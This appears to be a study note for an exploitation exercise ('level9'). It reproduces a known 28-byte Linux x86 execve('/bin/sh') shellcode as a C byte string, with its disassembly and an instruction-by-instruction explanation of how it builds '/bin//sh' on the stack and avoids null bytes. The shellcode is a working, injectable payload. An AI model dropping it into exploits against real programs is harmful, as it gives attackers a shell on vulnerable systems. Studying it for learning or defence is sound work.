# Shellcode level9 — Reference and line-by-line explanation

## Reference

**Title:** Linux x86 execve("/bin/sh") - 28 bytes  
**Author:** Jean Pascal Pereira \<pereira@secbiz.de\>  
**Source:** [shell-storm.org/shellcode/files/shellcode-811.html](https://shell-storm.org/shellcode/files/shellcode-811.html)

```c
char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";
```

The shellcode builds the string **"/bin//sh"** on the stack (with pushes), then calls **execve(ebx, ecx, edx)** with ebx = esp (pointer to the string), ecx = 0, edx = 0. No external string to concatenate.

---

## Disassembly (author) — AT&T syntax

```
08048060 <_start>:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80
```

---

## Explanation of each instruction (what the author does)

| Address   | Bytes       | Instruction (AT&T)   | Role |
|-----------|-------------|----------------------|------|
| 8048060   | 31 c0       | xor %eax,%eax        | **eax = 0**. Used for NULL (argv, env) and for the upcoming syscall number. |
| 8048062   | 50          | push %eax            | Push **0** onto the stack. Serves as **null terminator** for the "/bin//sh" string (byte after 'h'). |
| 8048063   | 68 2f 2f 73 68 | push $0x68732f2f | Push constant **0x68732f2f** (little-endian = "//sh" in ASCII: 68='h', 73='s', 2f='/', 2f='/'). Reading the stack: "//sh". |
| 8048068   | 68 2f 62 69 6e | push $0x6e69622f | Push **0x6e69622f** ("/bin" in LE: 6e='n', 69='i', 62='b', 2f='/'). The stack now contains **"/bin//sh\0"** (esp points at the start). |
| 804806d   | 89 e3       | mov %esp,%ebx        | **ebx = esp**. First argument of execve: pointer to the "/bin//sh" string (Linux accepts "/bin//sh" as "/bin/sh"). |
| 804806f   | 89 c1       | mov %eax,%ecx        | **ecx = eax = 0**. Second argument: **argv = NULL**. |
| 8048071   | 89 c2       | mov %eax,%edx        | **edx = eax = 0**. Third argument: **env = NULL**. |
| 8048073   | b0 0b       | mov $0xb,%al         | **al = 11** (0x0b). On i386 Linux, the **execve** syscall number is 11. |
| 8048075   | cd 80       | int $0x80            | **System call**: execve(ebx="/bin//sh", ecx=NULL, edx=NULL) → launches the shell. |
| 8048077   | 31 c0       | xor %eax,%eax        | **eax = 0** (for the exit syscall). |
| 8048079   | 40          | inc %eax             | **eax = 1**: **exit** syscall number. |
| 804807a   | cd 80       | int $0x80            | **exit(0)**. Run if execve fails (or depending on kernel behaviour after successful execve, the process is replaced so this code doesn't run in the normal case). |

---

## Flow summary

1. **Zero eax** then **push 0** → null terminator on the stack.
2. **Push "//sh"** then **push "/bin"** → the string **"/bin//sh\0"** is in memory, **esp** points at the start.
3. **ebx = esp** (path), **ecx = 0** (argv), **edx = 0** (env).
4. **eax = 11**, **int 0x80** → execve("/bin//sh", NULL, NULL).
5. **eax = 1**, **int 0x80** → exit(0) (fallback).

No null byte in the shellcode (except the one pushed on the stack at runtime), so it can be used in a C string or in the environment.

## References

- Shellcode 811: https://shell-storm.org/shellcode/files/shellcode-811.html
- `execve(2)`: https://man7.org/linux/man-pages/man2/execve.2.html
